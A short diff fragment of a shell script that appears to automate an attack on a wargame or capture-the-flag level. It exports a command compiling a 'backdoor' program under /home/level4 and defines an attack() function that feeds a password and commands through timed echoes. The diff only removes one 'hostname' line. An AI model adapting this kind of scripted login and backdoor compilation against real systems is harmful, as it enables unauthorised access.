@@ -15,7 +15,6 @@ export CMD3="gcc -o /home/level4/tmp/backdoor /home/level4/tmp/backdoor.c"
 
 attack() {
     sleep 2; echo "$PASS1"
-    sleep 1; echo "hostname"
     sleep 1; echo "$CMD1"
     sleep 1; echo "$CMD2"
     sleep 1; echo "$CMD3"
